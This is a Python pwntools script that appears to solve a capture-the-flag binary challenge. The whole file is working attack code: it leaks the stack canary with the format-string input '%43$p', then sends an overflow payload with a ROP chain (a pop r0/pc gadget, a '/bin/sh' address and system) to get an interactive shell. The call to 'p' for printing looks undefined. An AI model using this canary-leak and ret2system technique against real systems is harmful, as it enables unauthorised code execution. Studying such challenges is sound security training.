from pwn import *
from icecream import ic

elf = exe = ELF("./chall")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

sla("Tell me something: ", "%43$p")
rl()
canary = int(rl().strip().decode(), 16)
p(f"canary {hex(canary)}")

system = 0x17368
binsh = 0x72688
pop_r0_pc = 0x0006f25c

payload = cyclic(100)
payload += p32(canary)
payload += p32(0x00)
payload += p32(pop_r0_pc)
payload += p32(binsh)
payload += p32(system)

sla("before you leave?", payload)

io.interactive()
